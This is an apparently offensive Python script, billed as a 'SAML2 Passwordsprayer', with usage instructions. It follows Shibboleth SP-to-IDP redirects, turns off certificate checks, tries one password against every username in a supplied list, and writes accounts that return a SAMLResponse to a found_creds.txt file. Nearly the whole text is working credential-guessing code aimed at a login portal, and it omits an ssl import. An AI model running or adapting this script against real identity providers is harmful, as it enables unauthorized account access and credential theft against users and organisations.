#SAML2 Passwordsprayer
#Creates a handler that follows the redirections from the SP to the IDP
#logs in with each user from the passwordlist with the provided password
#uses python 3 syntax

#usage:python3 script.py /path/to/user-list Password
#i.e.: python3.7 script.py /project/maillist.txt Sommer2020
#Some characters in the password might need to be escaped with "\" so Sommer2020! becomes Sommer2020\!

#basic script taken from: https://stackoverflow.com/questions/16512965/logging-into-saml-shibboleth-authenticated-server-using-python

import urllib
import urllib.request
import urllib.parse
import sys
from termcolor import colored

SP="https://mysite.service"
IDP="https://idp.mysite/idp/profile/SAML2/Redirect/SSO?execution=e1s1" 

if len (sys.argv) < 3:
        print("Usage: script.py <path_to_user_file> <Password>")
        sys.exit(0)
else:
        print(">>> Starting Attack <<<")

userfile = sys.argv[1]
password = sys.argv[2]

class ShibRedirectHandler (urllib.request.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        return urllib.request.HTTPRedirectHandler.http_error_302(self,req,fp,code,msg,headers)

context=ssl._create_unverified_context()

print("Spraying Password: ",password)
with open(userfile) as mf:
        for line in mf:
            cookieprocessor = urllib.request.HTTPCookieProcessor()
            sslHandler = urllib.request.HTTPSHandler(context=context)
            opener = urllib.request.build_opener(sslHandler, ShibRedirectHandler, cookieprocessor)
            opener.addheaders = [("Authorization", "Basic 123ABC"),('User-agent', 'Mozilla/5.0')]
            print("==> Following Redirections for SAML2 Auth to the IDP")
            (opener.open(SP).read())

#Inspect the page source of the SAML2 login form; find the input names for the username
#and password, and maybe other arguments that get passed. Use burp or alike
            print("Trying: ",line.rstrip())
            loginData = urllib.parse.urlencode({'j_username':line.rstrip(),'j_password':password,'_eventId_proceed':''})
            bLoginData = loginData.encode('ascii')
            response = opener.open(IDP, bLoginData)

#Check if we get a SAMLResponse back or not. If so we´ve got a match.
            x=str(response.read())
            if "SAMLResponse" in x:
               string = "Houston we have a SAML Response for: "+line.rstrip()
               logtext = line.rstrip()+":"+password
               print(colored(string,"green"))
               log = open("found_creds.txt", "a+")
               log.write(logtext+"\n")
               log.close()
            else:
               string = "NOPE! No hit for: "+line.rstrip()+". More luck next time..."
               print(colored(string,"red"))
